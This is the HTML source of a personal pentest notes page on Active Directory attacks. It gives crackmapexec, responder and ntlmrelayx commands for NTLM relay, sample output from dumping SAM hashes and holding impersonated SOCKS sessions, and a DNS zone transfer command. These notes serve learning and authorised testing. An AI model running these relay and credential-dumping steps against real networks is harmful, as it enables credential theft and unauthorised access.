@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>💥 AD-Attacks</title>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css"/>
+<link rel="stylesheet" href="/css/layouts/main.css"/>
+<link rel="stylesheet" href="/css/navigators/navbar.css"/>
+<link rel="stylesheet" href="/css/plyr.css"/>
+
+<link rel="stylesheet" href="/css/flag-icon.min.css"/>
+
+
+<link rel="stylesheet" href="/google-fonts/Mulish/mulish.css"/>
+
+
+<link rel="stylesheet" href="/fontawesome/css/all.min.css"/>
+
+
+
+<link rel="stylesheet" href="/css/colortheme/colortheme.css"/>
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+  
+
+  <link rel="icon" type="image/png" href="/images/adrien_huf2f5d60ef13d1016ef7a4d62ed3a4d6d_22569_42x0_resize_box_3.png" />
+
+<meta property="og:title" content="💥 AD-Attacks" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://AlrikRr.github.io/notes/active-directory/attacks/" />
+
+
+    
+    
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/atom-one-dark.min.css"
+  />
+  <link rel="stylesheet" href="/css/layouts/notes.css">
+  <link rel="stylesheet" href="/css/navigators/sidebar.css">
+
+
+    
+
+
+
+
+</head>
+
+  <body data-spy="scroll" data-target="#TableOfContents" data-offset="80">
+    <div class="container-fluid bg-dimmed wrapper">
+      
+      
+    
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+  
+  
+    
+  
+  
+
+
+
+  
+  
+    
+  
+  
+
+
+<nav class="navbar navbar-expand-xl top-navbar final-navbar shadow">
+  <div class="container">
+      <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button" onclick="toggleSidebar()">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <a class="navbar-brand" href="/">
+      
+        <img src="/images/adrien_huf2f5d60ef13d1016ef7a4d62ed3a4d6d_22569_42x0_resize_box_3.png" alt="Logo">
+      AlrikRr&#39;s Blog</a>
+    <button class="navbar-toggler navbar-light" id="toc-toggler" type="button" onclick="toggleTOC()">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse lang-selector" id="top-nav-items">
+      <ul class="navbar-nav ml-auto">
+      
+      
+        <li class="nav-item dropdown">
+
+<div id="theme-initialization" style="display: none;"
+  default-theme="system"></div>
+<a class="nav-link dropdown-toggle"  href="#" id="themeSelector" role="button"
+  data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  <img id="navbar-theme-icon-svg" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+</a>
+<div class="dropdown-menu dropdown-menu-icons-only" aria-labelledby="themeSelector">
+  <a class="dropdown-item nav-link" href="#" onclick="enableLightTheme()">
+    <img class="menu-icon-center" src="/icons/sun-svgrepo-com.svg" width=20 alt="Light Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" onclick="enableDarkTheme()">
+    <img class="menu-icon-center" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" onclick="useSystemTheme()">
+    <img class="menu-icon-center" src="/icons/computer-svgrepo-com.svg" width=20 alt="System Theme">
+  </a>
+</div>
+</li>
+      
+      </ul>
+    </div>
+  </div>
+  
+  
+    <img src="/images/adrien_huf2f5d60ef13d1016ef7a4d62ed3a4d6d_22569_42x0_resize_box_3.png" class="d-none" id="main-logo" alt="Logo">
+  
+  
+    <img src="/images/adrien_huf2f5d60ef13d1016ef7a4d62ed3a4d6d_22569_42x0_resize_box_3.png" class="d-none" id="inverted-logo" alt="Inverted Logo">
+  
+</nav>
+
+
+
+      
+      
+  
+  
+
+  <section class="sidebar-section" id="sidebar-section">
+    <div class="sidebar-holder">
+      <div class="sidebar" id="sidebar">
+        <form class="mx-auto" method="get" action="/search">
+          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
+        </form>
+        <div class="sidebar-tree">
+          <ul class="tree" id="tree">
+            <li id="list-heading"><a href="/notes" data-filter="all">Notes</a></li>
+            <div class="subtree">
+                
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i class="fas fa-minus-circle"></i><a class="active" href="/notes/active-directory/">🧙‍♂️ Active Directory</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class="" href="/notes/active-directory/documentation/" title="⚒️ Tools-Documentation">⚒️ Tools-Documentation</a></li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i class="fas fa-minus-circle"></i><a class="active" href="/notes/active-directory/attacks/">💥 AD-Attacks</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class="" href="/notes/active-directory/attacks/ntlm-relay/" title="NTLM-Relay">NTLM-Relay</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class="" href="/notes/active-directory/attacks/dns/" title="DNS Attacks">DNS Attacks</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class="" href="/notes/active-directory/0-recon/" title="0️⃣ Recon AD">0️⃣ Recon AD</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class="" href="/notes/active-directory/1-enum-no-creds/" title="1️⃣ Enum - No Credentials">1️⃣ Enum - No Credentials</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+
+            </div>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+      
+      
+<section class="content-section" id="content-section">
+  <div class="content container-fluid" id="content">
+    <div class="container-fluid note-card-holder" id="note-card-holder">
+      
+      
+        
+          <div class="note-card ">
+    <div class="item">
+        <h5 class="note-title"><span>NTLM-Relay Multi-Targets</span></h5>
+        
+            <div class="card">
+                <div class="card-body"><p>First gather all the ips that do not require smb signing</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+</span></span></code></pre></div><p>Then edit responder configuration</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim /usr/share/responder/responder.conf
+</span></span></code></pre></div><p>Turn off the SMB and HTTP option, then run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I ppp0 -v
+</span></span></code></pre></div><p>Once the responder is up, you can run ntlm relay attack using impacket tools</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -t 192.168.64.129 -smb2support
+</span></span><span style="display:flex;"><span>ntlmrelayx.py -tf targets.txt -smb2support -i
+</span></span></code></pre></div><p>More about it :</p>
+<ul>
+<li><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay">viperone</a></li>
+<li><a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx">blog fox-it</a></li>
+</ul>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+<div class="note-card ">
+    <div class="item">
+        <h5 class="note-title"><span>NTLM-Relay One-Shot</span></h5>
+        
+            <div class="card">
+                <div class="card-body"><p>The hacker (<code>192.168.195.175</code>) Select a target in the network (<code>192.168.195.5</code>). The victim is <code>192.168.195.3</code></p>
+<p>First we run the ntlm relay pointing to the target, every user trying to authenticate on this machine will be trigger.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -t 192.168.195.5
+</span></span></code></pre></div><p>Output of dumping SAM base hn the victime connect to target</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Received connection from 192.168.195.3, attacking target smb://192.168.195.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://192.168.195.5 as EJEMPLO<span style="color:#ae81ff">\A</span>dministrator SUCCEED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service RemoteRegistry is in stopped state
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service RemoteRegistry
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x0fb1f3fb0688d27f094450941220df42
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>adminSQL:1000:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done dumping SAM hashes <span style="color:#66d9ef">for</span> host: 192.168.195.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopping service RemoteRegistry
+</span></span></code></pre></div><p>Source : <a href="https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/"> secureauth </a></p>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+<div class="note-card ">
+    <div class="item">
+        <h5 class="note-title"><span>NTLM-Relay Socks Multi-Sessions</span></h5>
+        
+            <div class="card">
+                <div class="card-body"><p>Use the socks option from <code>ntlmrelayx.py</code> , in a few words the tool architecture was redesigned to include a SOCKS server and the SOCKS relay plugins, which allows <strong>holding the authenticated sessions active to be used and reused later</strong> (whenever we want) through a SOCKS proxy.</p>
+<p>More about sock module : <a href="https://www.secureauth.com/blog/playing-with-relayed-credentials/">secureauth</a></p>
+<p><strong>So far, we are still experiencing some limitations:</strong></p>
+<ul>
+<li>We have the one-to-one relationship: one victim, one relay.</li>
+<li>We don’t have control over which user we want to relay.</li>
+</ul>
+<p>With the help of IPC$ share, we cn know the identity of the user trigger, if we want a specific user to be reuse again and again the hacke will send a STATU_NETWORK_SESSION_EXPIRED to the victim, windows will automatically re-negociate with the victim, every single time.</p>
+<h2 id="attack">Attack</h2>
+<p>First install latest version of impacket, then create a file with a list of targets following this format</p>
+<pre tabindex="0"><code>smb://EJEMPLO\Administrator@192.168.195.2
+smb://EJEMPLO\Administrator@192.168.195.3
+smb://EJEMPLO\Operator@192.168.195.7
+192.168.195.7
+192.168.195.10
+</code></pre><p>Then, we run the <em>ntlmrelayx.py</em> script with the <em>-socks</em> parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -tf targets.txt -socks -smb2support
+</span></span></code></pre></div><p>The relay server is active and listening for connections. After a while, we receive a single incoming SMB connection. Our Administrator friend again. The script processes all the target file, matching the picked user with the victims, and relays the authentication data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3 as EJEMPLO/ADMINISTRATOR SUCCEED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.3<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2 as EJEMPLO/ADMINISTRATOR SUCCEED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.2<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+</span></span></code></pre></div><p>We can check the list of active sessions by typing <em>socks</em> at the <em>ntlmrelayx.py</em> prompt:</p>
+<p><img src="ntlm.relay.socks.1.png" alt="socks 1"></p>
+<p>Let&rsquo;s suppose that two new connections from different users are created against our server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Connection from EJEMPLO/NORMALUSER@192.168.195.6 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7 as EJEMPLO/NORMALUSER SUCCEED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/NORMALUSER@192.168.195.7<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+</span></span></code></pre></div><p>The script processes all the target file again, matching the grabbed identities. Finally, checking the session list, we can see that we have multiple active sessions impersonating different users waiting to be used :</p>
+<p><img src="ntlm.relay.socks.2.png" alt="socks 2"></p>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+        
+      
+        
+          <div class="note-card ">
+    <div class="item">
+        <h5 class="note-title"><span>Zone Transfer</span></h5>
+        
+            <div class="card">
+                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig axfr xyz.local@dc01.xyz.local
+</span></span></code></pre></div></div>
+            </div>
+        
+    </div>
+</div>
+
+
+        
+      
+    </div>
+    <div class="paginator">
+      
+    </div>
+  </div>
+</section>
+
+
+      
+       
+    </div>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+  
+      
+  
+
+
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+
+  
+  
+    
+    
+      
+    
+  
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+
+  
+  
+  
+
+  <footer id="footer" class="container-fluid text-center align-content-center footer pb-2">
+    <div class="container pt-5">
+      <div class="row text-left">
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Navigation</h5>
+          
+          <ul>
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#recent-posts">Recent Posts</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#about">About</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#skills">Skills</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#experiences">Experiences</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#projects">Projects</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://AlrikRr.github.io#achievements">Achievements</a>
+                </li>
+              
+            
+              
+            
+          </ul>
+          
+        </div>
+        
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Contact me:</h5>
+          <ul>
+            
+              
+                <li><a href=mailto:adrienlasalle[dot]pro[&#43;]contact[at]gmail[dot]com target="_blank" rel="noopener">
+                  <span><i class="fas fa-envelope"></i></span> <span>adrienlasalle[dot]pro[&#43;]contact[at]gmail[dot]com</span>
+                </a></li>
+              
+            
+          </ul>
+        </div>
+        
+        
+        
+      </div>
+    </div>
+    
+    
+    <hr />
+    <div class="container">
+      <div class="row text-left">
+        <div class="col-md-4">
+          <a id="theme" href="https://github.com/hugo-toha/toha" target="_blank" rel="noopener">
+            <img src="/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png" alt="Toha Theme Logo">
+            Toha
+          </a>
+        </div>
+        <div class="col-md-4 text-center">AlrikRr © 2022 Copyright.</div>
+        <div class="col-md-4 text-right">
+          <a id="hugo" href="https://gohugo.io/" target="_blank" rel="noopener">Powered by
+          <img
+            src="/images/hugo-logo.svg"
+            alt="Hugo Logo"
+            height="18"
+          />
+          </a>
+        </div>
+      </div>
+    </div>
+    
+  </footer>
+
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<script type="text/javascript" src="/js/popper.min.js"></script>
+<script type="text/javascript" src="/js/bootstrap.min.js"></script>
+
+<script type="text/javascript" src="/js/navbar.js"></script>
+<script type="text/javascript" src="/js/plyr.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+
+
+<script type="text/javascript" src="/js/darkreader.js"></script>
+<script type="text/javascript" src="/js/darkmode-darkreader.js"></script>
+
+
+
+    
+    
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js"></script>
+  <script src="/js/imagesloaded.pkgd.min.js"></script>
+  <script src="/js/note.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+
+
+    
+</body>
+</html>
